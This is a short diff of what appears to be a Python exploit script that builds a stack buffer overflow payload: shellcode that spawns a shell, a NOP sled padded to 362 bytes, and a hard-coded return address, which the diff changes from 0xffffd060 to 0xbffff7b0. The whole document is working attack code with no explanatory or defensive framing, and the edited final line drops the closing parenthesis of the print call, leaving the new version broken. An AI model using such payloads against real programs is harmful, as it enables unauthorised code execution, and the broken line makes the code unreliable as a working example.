@@ -7,8 +7,7 @@ shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73"
 "\xcd\x80\x31\xc0\x40\xcd\x80")
 
 NOP_SLED = "\x90"*(362 - len(shellcode))
-#0xffffd060
-EIP = "\x60\xd0\xff\xff"
+EIP = "\xb0\xf7\xff\xbf"
 payload = NOP_SLED + shellcode + EIP
 
-print(payload)
+print(payload
